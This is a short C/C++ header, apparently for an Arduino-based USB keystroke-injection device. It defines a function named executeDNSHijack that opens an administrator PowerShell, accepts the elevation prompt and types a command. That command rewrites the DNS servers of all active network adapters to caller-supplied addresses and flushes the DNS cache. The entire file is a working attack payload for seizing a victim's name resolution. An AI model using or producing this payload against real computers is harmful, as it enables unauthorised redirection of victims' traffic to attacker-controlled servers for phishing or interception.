#ifndef DNS_HIJACK_H
#define DNS_HIJACK_H

void executeDNSHijack(String dns1 = "8.8.8.8", String dns2 = "1.1.1.1") {
    run();
    delay(500);
    openPowerShellAdmin();
    delay(1000);
    admin();
    delay(1000);

    // Build PowerShell DNS hijack command
    String dnsCommand = "$adapters = Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}; ";
    dnsCommand += "foreach($adapter in $adapters) { ";
    dnsCommand += "Set-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex -ServerAddresses ('" + dns1 + "','" + dns2 + "'); ";
    dnsCommand += "} ";
    dnsCommand += "Clear-DnsClientCache; ";
    dnsCommand += "exit;";

    typeWithDelay(dnsCommand);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(1000);
}

#endif
